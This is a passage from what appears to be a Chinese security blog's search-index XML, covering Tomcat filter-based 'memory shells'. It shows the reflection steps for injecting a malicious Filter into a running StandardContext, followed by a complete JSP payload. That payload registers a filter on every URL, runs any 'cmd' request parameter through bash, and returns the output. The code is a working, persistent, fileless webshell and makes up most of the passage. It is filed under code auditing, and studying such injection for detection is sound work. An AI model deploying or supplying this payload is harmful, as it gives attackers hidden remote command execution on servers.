class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>filterDef.setFilter(filter);<br>filterDef.setFilterName(name);<br>filterDef.setFilterClass(filter.getClass().getName());<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 将filterDef添加到filterDefs中</span><br><span class="hljs-comment"> */</span><br>standardContext.addFilterDef(filterDef);<br></code></pre></td></tr></table></figure><p><code>构造ApplicationFilterConfig</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);<br>constructor.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);<br></code></pre></td></tr></table></figure><p><code>添加到 filterConfigs中</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">  <span class="hljs-type">Field</span> <span class="hljs-variable">Configs</span> <span class="hljs-operator">=</span> standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>  Configs.setAccessible(<span class="hljs-literal">true</span>);<br>  <span class="hljs-type">Map</span> <span class="hljs-variable">filterConfigs</span> <span class="hljs-operator">=</span> (Map) Configs.get(standardContext);<br>filterConfigs.put(name,filterConfig);<br></code></pre></td></tr></table></figure><p><strong>大致流程</strong></p><blockquote><ol><li>创建一个恶意 Filter</li><li>利用 FilterDef 对 Filter 进行封装</li><li>将 FilterDef 添加到 FilterDefs 和 FilterConfig</li><li>创建 FilterMap 存放到 filterMaps</li></ol></blockquote><h5 id="完整内存马"><a href="#完整内存马" class="headerlink" title="完整内存马"></a>完整内存马</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Map&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Context&quot;</span> %&gt;<br>&lt;%@ page language=<span class="hljs-string">&quot;java&quot;</span> contentType=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="hljs-string">&quot;UTF-8&quot;</span>%&gt;<br><br>&lt;%<br>    <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;buer5ec&quot;</span>;<br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getSession().getServletContext();<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">appctx</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    appctx.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) appctx.get(servletContext);<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">stdctx</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    stdctx.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) stdctx.get(applicationContext);<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">Configs</span> <span class="hljs-operator">=</span> standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>    Configs.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">filterConfigs</span> <span class="hljs-operator">=</span> (Map) Configs.get(standardContext);<br><br>    <span class="hljs-keyword">if</span> (filterConfigs.get(name) == <span class="hljs-literal">null</span>)&#123;<br>      <span class="hljs-type">Filter</span> <span class="hljs-variable">filter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Filter</span>() &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br><br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>          <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (HttpServletRequest) servletRequest;<br>          <span class="hljs-keyword">if</span> (req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-string">&quot;bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).start();<br>            <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> process.getInputStream().read(bytes);<br>            servletResponse.getWriter().write(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bytes,<span class="hljs-number">0</span>,len));<br>            process.destroy();<br>            <span class="hljs-keyword">return</span>;<br>          &#125;<br>          filterChain.doFilter(servletRequest,servletResponse);<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br><br>        &#125;<br><br>      &#125;;<br><br><br>      <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>      filterDef.setFilter(filter);<br>      filterDef.setFilterName(name);<br>      filterDef.setFilterClass(filter.getClass().getName());<br>      <span class="hljs-comment">/**</span><br><span class="hljs-comment">       * 将filterDef添加到filterDefs中</span><br><span class="hljs-comment">       */</span><br>      standardContext.addFilterDef(filterDef);<br><br>      <span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>      filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br>      filterMap.setFilterName(name);<br>      <span class="hljs-comment">//filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br>      <span class="hljs-comment">/*</span><br><span class="hljs-comment">       * 将filterMap 添加到 filterMaps中</span><br><span class="hljs-comment">       */</span><br>      standardContext.addFilterMapBefore(filterMap);<br><br>      <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);<br>      constructor.setAccessible(<span class="hljs-literal">true</span>);<br>      <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);<br><br>      filterConfigs.put(name,filterConfig);<br>      out.print(<span class="hljs-string">&quot;Inject Success !&quot;</span>);<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内存马</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
